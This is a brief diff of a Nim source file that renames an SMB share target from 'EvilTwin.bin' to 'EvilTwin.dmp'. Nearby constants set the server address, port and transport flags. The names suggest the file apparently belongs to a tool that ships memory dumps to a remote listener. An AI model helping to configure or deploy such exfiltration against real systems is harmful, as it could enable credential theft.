@@ -4,7 +4,7 @@ import std/[strformat, strutils, dynlib, tables, net]
 
 const serverIP = "0.0.0.0"
 const serverPort = 6500
-const smbShare = fmt"\\{serverIP}\Share\EvilTwin.bin"
+const smbShare = fmt"\\{serverIP}\Share\EvilTwin.dmp"
 
 const useSMB = false
 const useRawSocket = true
